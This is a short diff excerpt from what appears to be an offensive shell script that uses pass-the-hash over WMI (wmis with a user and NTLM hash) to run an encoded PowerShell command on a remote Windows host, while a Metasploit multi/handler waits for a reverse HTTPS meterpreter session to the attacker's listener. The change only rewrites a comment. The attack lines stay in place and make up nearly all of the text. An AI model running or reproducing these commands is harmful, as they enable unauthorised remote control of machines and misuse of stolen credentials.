@@ -62,5 +62,5 @@ command="cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode"
 #start multi/handler
 msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_https LHOST=$lhost LPORT=$lport E
 
-#execute wmis -U "$user"%"$hash" //"$rhost" "cmd.exe /c "$command""
+#pth with WMI to execute meterpreter
 wmis -U $user%$hash //$rhost "$command"
